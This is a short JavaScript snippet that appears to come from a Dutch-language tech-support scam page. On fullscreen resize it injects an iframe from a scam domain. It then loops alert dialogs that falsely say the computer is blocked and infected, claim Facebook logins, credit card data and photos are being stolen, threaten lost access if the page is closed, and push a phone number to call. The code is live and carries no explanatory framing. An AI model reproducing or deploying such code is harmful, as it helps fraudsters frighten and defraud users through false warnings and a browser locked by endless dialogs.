window.addEventListener('resize', function(){
  if(screen.width === window.innerWidth){
		document.getElementById('auth').innerHTML = "<iframe src='https://security-error-reported.in/2/chrome/auth.php'  ></iframe>";
		}		
		setInterval(function () { alert("** Als u computer is geblokkeerd.\n\nFoutmelding # DW6VB36.\n\nBel dan direct naar: 030-3100429 .\n Let op!, negeer deze kritieke waarschuwing niet.Als u deze pagina probeert te sluiten, zal uw computer toegang worden uitgeschakeld om verdere schade aan het netwerk te voorkomen. Uw computer is mogelijk geïnfecteerd met een virus en spyware en kunnen de volgende informatie van u stelen:  ... \n\n Facebook Login\n >creditcard gegevens\n > Inlog gegevens e-mailaccount\n >foto's die zijn opgeslagen op die computer..\n Contacteer ons zo spoedig mogelijk om verdere schade aan u computer te voorkomen, schakel u computer niet uit. Onze support afdeling zal samen met u de stappen doornemen om het proces te stoppen en eventueel verdere besmetting van u computer te verwijderen.\n\n Telefoonnummer: 030-3100429") }, 0000);	
});



